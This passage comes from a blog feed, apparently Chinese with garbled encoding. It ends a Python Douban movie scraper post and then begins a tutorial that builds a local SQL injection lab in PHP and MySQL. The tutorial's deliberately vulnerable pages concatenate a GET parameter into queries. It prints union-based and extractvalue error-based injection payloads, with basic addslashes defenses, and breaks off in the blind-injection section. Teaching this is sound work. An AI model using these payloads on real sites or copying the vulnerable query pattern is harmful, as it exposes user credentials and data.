class="string">&#x27;éƒ¨ç”µå½±ä¿¡æ¯ã€‚&#x27;</span>)</span><br><span class="line">        <span class="comment"># è·å–ç”µå½±ä¿¡æ¯</span></span><br><span class="line">        soup=BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;title&#x27;</span>).get_text()</span><br><span class="line">            movie_title.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;other&#x27;</span>).get_text()</span><br><span class="line">            movie_other.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;info&#x27;</span>):</span><br><span class="line">            info = t.find(<span class="string">&#x27;p&#x27;</span>).get_text().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            movie_info.append(info)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            fen = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;rating_num&#x27;</span>).get_text()</span><br><span class="line">            movie_fen.append(fen)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>,<span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            num = t.find_all(<span class="string">&#x27;span&#x27;</span>)[<span class="number">3</span>].get_text()</span><br><span class="line">            movie_num.append(num)</span><br><span class="line">    <span class="keyword">return</span> movie_title,movie_other,movie_info,movie_fen,movie_num</span><br><span class="line"></span><br><span class="line">a,b,c,d,e=get_movies()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">import</span> codecs</span><br><span class="line">    <span class="comment"># å°†è·å–ä¿¡æ¯å†™å…¥TXTæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;c:\\Users\\32662\\Desktop\\douban.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;è±†ç“£ç”µå½± Top 250\n\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>):</span><br><span class="line">                f.write(<span class="string">&#x27;Top&#x27;</span>+<span class="built_in">str</span>(n+<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">&#x27;ç”µå½±åï¼š&#x27;</span>+a[n]+b[n]+c[n]+<span class="string">&#x27;è±†ç“£è¯„åˆ†&#x27;</span>+d[n]+<span class="string">&#x27; &#x27;</span>+e[n])</span><br><span class="line">                f.write(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="æ‰§è¡Œç»“æœ"><a href="#æ‰§è¡Œç»“æœ" class="headerlink" title="æ‰§è¡Œç»“æœ"></a>æ‰§è¡Œç»“æœ</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145621481.png" alt="image-20210314145621481"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145657377.png" alt="image-20210314145657377"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</title>
      <link href="posts/33159.html"/>
      <url>posts/33159.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>æµ‹è¯•ç¯å¢ƒï¼š</p><p>Apache2.4</p><p>php7.4</p><p>MySQL8.0.22</p></blockquote><h1 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP + MySQL"></a>PHP + MySQL</h1><p>é€šè¿‡PHP å¯ä»¥æ“ä½œMySQLä¸­çš„æ•°æ®ï¼Œä½†é¦–å…ˆéœ€è¦è§£å†³çš„é—®é¢˜æ˜¯PHPå¦‚ä½•è¿æ¥åˆ°MySQL?</p><p>æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼ï¼š</p><ul><li>MySQLi (é¢å‘å¯¹è±¡)</li><li>MySQLi (é¢å‘è¿‡ç¨‹)</li><li>PDO(PHP Data Objects)</li></ul><p>åŒºåˆ«åœ¨äºï¼šPDO åº”ç”¨åœ¨ 12 ç§ä¸åŒæ•°æ®åº“ä¸­ï¼Œ MySQLi åªé’ˆå¯¹ MySQL æ•°æ®åº“ã€‚</p><p>MySQLi å’Œ PDOåœ¨PHPå®‰è£…æ—¶å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯è‡ªåŠ¨å®‰è£…çš„ï¼Œå¯èƒ½éœ€è¦åšçš„æ˜¯åœ¨PHPé…ç½®æ–‡ä»¶ <code>php.ini</code>ä¸­å¼€å¯ç›¸åº”æ¨¡å—ï¼ˆå»æ‰å‰é¢çš„åˆ†å·ï¼‰ï¼Œå®‰è£…æƒ…å†µå¯é€šè¿‡<code>phpinfo()</code>è¿›è¡ŒæŸ¥çœ‹ã€‚</p><p>ä¿®æ”¹<code>php.ini</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306205054865.png"></p><p>é€šè¿‡<code>phpinfo()</code> æŸ¥çœ‹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204317682.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204242649.png"></p><p><strong>ä¸‰ç§è¿æ¥æ–¹å¼ç¤ºä¾‹ï¼š</strong></p><p>MySQLi (é¢å‘å¯¹è±¡)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>MySQLi (é¢å‘è¿‡ç¨‹)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ£€æµ‹è¿æ¥</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PDO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æµ‹è¯•ä»£ç ä½¿ç”¨MySQLi (é¢å‘è¿‡ç¨‹)è¿›è¡Œè¿æ¥ï¼Œéƒ¨åˆ†ä»£ç å‚è€ƒäºsqlilabsæºç ã€‚</p><h1 id="å›æ˜¾æ³¨å…¥"><a href="#å›æ˜¾æ³¨å…¥" class="headerlink" title="å›æ˜¾æ³¨å…¥"></a>å›æ˜¾æ³¨å…¥</h1><p>å›æ˜¾æ³¨å…¥æ˜¯æŒ‡æˆ‘ä»¬çš„æŸ¥è¯¢å†…å®¹ä¼šæ˜¾ç¤ºåˆ°é¡µé¢ä¸­,é€ æˆçš„åŸå› ä¹‹ä¸€æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ã€‚</p><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLå¸¸è§„å›æ˜¾æ³¨å…¥ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your usernameï¼š&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your passwordï¼š&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306225550792.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232323655.png"></p><p><strong>æ³¨å…¥è¯­å¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1&#39; union select 1,(select database()),(select version())--+</span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥ç»“æœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306224726475.png"></p><p><strong>é˜²å¾¡ä»£ç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤</span></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307192422989.png" alt="image-20210307192422989"></p><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><p>æŠ¥é”™æ³¨å…¥æ˜¯æŒ‡é¡µé¢ä¸è¿”å›å†…å®¹æ•°æ®ï¼Œæ— æ³•ä»å›æ˜¾ç»“æœè·å¾—ä¿¡æ¯ï¼›ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šä¿ç•™SQLçš„æŠ¥é”™å‡½æ•°<code>mysqli_error()</code> ï¼›é€šè¿‡<code>extractvalue</code> <code>UpdateXml</code> <code>floor</code>ç­‰å‡½æ•°æ„é€ é”™è¯¯çš„è¯­å¥ä»¥ä»æŠ¥é”™ä¿¡æ¯ä¸­è·å¾—æƒ³è¦çš„ä¿¡æ¯ã€‚é€ æˆçš„åŸå› ä¹‹ä¸€ä¹Ÿæ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥è¾“å…¥éé¢„æœŸçš„å†…å®¹ä»è€Œè·å¾—æ•æ„Ÿçš„æ•°æ®ï¼Œåªä¸è¿‡æŠ¥é”™æ³¨å…¥æ˜¯åˆ©ç”¨é”™è¯¯ä¿¡æ¯å›æ˜¾ã€‚</p><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLæŠ¥é”™æ³¨å…¥ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232515661.png"></p><p><strong>æ³¨å…¥è¯­å¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥ç»“æœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232739874.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><p>å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶å–æ¶ˆæŠ¥é”™ä¿¡æ¯æ˜¾ç¤ºç­‰ã€‚</p><h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h1><p>ç›²æ³¨æŒ‡æ— æ³•åˆ©ç”¨å›æ˜¾å’ŒæŠ¥é”™ä¿¡æ¯ç­‰æƒ…å†µï¼Œè¿›è¡Œçš„ä¸€ç§sqlæ³¨å…¥æ–¹æ³•ã€‚</p><p>ç›²æ³¨ä¸»è¦åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li>å¸ƒå°”ç›²æ³¨ï¼šé€šè¿‡åˆ¤æ–­é¡µé¢å“åº”æƒ…å†µåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</li><li>æ—¶é—´ç›²æ³¨ï¼šåˆ©ç”¨é¡µé¢åŠ è½½æ—¶é—´æ¥åˆ¤æ–­åç«¯æ•°æ®åº“æ˜¯å¦æ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„sqlè¯­å¥ï¼Œæœ¬è´¨è¿˜æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥éšæ„é—­åˆï¼Œæ„é€ è‡ªå·±éœ€è¦çš„sqlè¯­å¥ã€‚</li></ul><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLç›²æ³¨ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not in ...&#x27;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>; <span class="comment">// å¸ƒå°”ç›²æ³¨</span></span><br><span class="line">         <span class="comment">//echo &#x27;You are in ...&lt;hr&gt;&#x27;; // æ—¶é—´ç›²æ³¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span 